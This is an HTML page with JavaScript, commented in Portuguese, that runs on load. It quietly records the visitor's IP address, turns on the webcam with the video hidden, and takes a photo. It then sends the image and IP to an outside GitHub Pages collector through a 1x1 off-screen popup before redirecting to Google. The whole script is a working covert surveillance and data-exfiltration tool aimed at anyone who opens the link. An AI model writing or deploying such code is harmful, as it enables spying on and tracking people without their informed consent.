<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Foto Autom√°tica</title>
</head>
<body style="background-color: #f0f0f0; text-align: center; padding-top: 50px;">
    
    <h1>üì∏ Capturando Imagem...</h1>
    <p>Por favor, aguarde, voc√™ ser√° redirecionado em breve.</p>

    <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ==========================================================
        // CONFIGURA√á√ÉO
        // ==========================================================
        
        // üö® SUBSTITUA por sua URL real do ClienteViewFoto no GitHub Pages
        const VIEW_SITE_URL = 'https://leozin-code.github.io/ClienteViewFoto/'; 
        
        const REDIRECT_URL = 'https://www.google.com';

        const video = document.getElementById('webcam-video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let photoData = null;
        let userIP = 'IP_NAO_ENCONTRADO';
        let webcamStream = null;

        // Fun√ß√µes de captura de IP, webcam e foto (n√£o alteradas)
        function fetchUserIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIP = data.ip;
                })
                .catch(error => {
                    console.warn("Falha ao obter IP. Usando IP_NAO_ENCONTRADO.", error);
                });
        }
        function startWebcam() {
            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                .then(stream => {
                    webcamStream = stream;
                    video.srcObject = stream;
                    return new Promise(resolve => video.onloadedmetadata = resolve);
                });
        }
        function takePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            photoData = canvas.toDataURL('image/png').split(',')[1];
        }

        // 4. Finalizar e Redirecionar (Usando a l√≥gica de janela tempor√°ria)
        function finalize(data) {
            // Parar o stream da webcam
            if (webcamStream) {
                webcamStream.getTracks().forEach(track => track.stop());
            }

            if (data && data.img) {
                // Constr√≥i a URL com os dados
                const finalURL = VIEW_SITE_URL + 
                                 `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
                
                // üö® MUDAN√áA CR√çTICA: Abre uma nova aba com a URL de salvamento
                // Usamos dimens√µes m√≠nimas para ser menos invasivo.
                const newWindow = window.open(finalURL, '_blank', 'width=1,height=1,left=9999,top=9999');

                // Tempo de espera para garantir que o SiteViewFoto.html carregue e salve
                setTimeout(() => {
                    try {
                        if (newWindow && !newWindow.closed) {
                            newWindow.close(); // Tenta fechar a aba de salvamento
                        }
                    } catch (e) {
                        console.warn("N√£o foi poss√≠vel fechar a janela de salvamento automaticamente.");
                    }
                    
                    // Redireciona o usu√°rio para o Google (na aba original)
                    window.location.href = REDIRECT_URL;

                }, 2000); // 2 segundos de espera para o salvamento
                
            } else {
                 // Se falhou, redireciona diretamente
                 window.location.href = REDIRECT_URL;
            }
        }

        // Fluxo Principal (executa sequencialmente)
        async function runCaptureFlow() {
            await fetchUserIP();
            
            try {
                await startWebcam();
                takePhoto();
                finalize({ ip: userIP, img: photoData });
            } catch (e) {
                console.error("Erro no fluxo de captura:", e);
                finalize(null); 
            }
        }

        window.onload = runCaptureFlow;
    </script>
</body>
</html>
